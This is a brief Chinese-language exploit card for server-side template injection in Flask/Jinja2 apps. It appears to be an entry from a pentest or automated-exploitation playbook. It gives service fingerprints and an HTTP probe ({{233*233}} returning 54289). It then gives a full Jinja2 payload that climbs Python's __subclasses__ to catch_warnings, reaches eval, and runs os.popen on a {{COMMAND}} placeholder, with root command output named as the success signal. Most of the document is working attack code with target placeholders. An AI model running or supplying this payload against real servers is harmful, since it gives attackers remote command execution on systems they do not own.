# Flask (Jinja2) SSTI RCE (ssti)

## 指纹特征
- 服务: Flask + Jinja2
- 端口: 8000 (典型)
- 特征: URL 参数或输入字段直接被渲染进模板

## 利用矩阵
| 触发方式 | 关键 Payload | 目的 |
| :--- | :--- | :--- |
| 数值计算验证 | `{{233*233}}` | 验证 SSTI 存在 |
| Python 对象注入 | `[].__class__.__base__...` | RCE |

## PoC 指令

**1. 漏洞验证**
```http
GET /?name={{233*233}} HTTP/1.1
Host: {{TARGET}}:8000
```
*响应结果若为 54289 则确认存在漏洞。*

**2. 远程代码执行 (RCE)**
利用 `__subclasses__` 查找可用的类（如 `catch_warnings`）并获取其全局环境中的 `eval` 或 `popen`：

```python
# RCE Payload (URL 编码后发送)
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("{{COMMAND}}").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

## Success Signal
- **结果回显**: 页面上直接显示系统命令的输出（如 `uid=0(root)`）。
- **验证特征**: 响应 Body 中出现预期的命令执行字符串。
| 关键类名 | 说明 |
| :--- | :--- |
| `catch_warnings` | 常见的利用类，其全局变量包含 `__builtins__` |
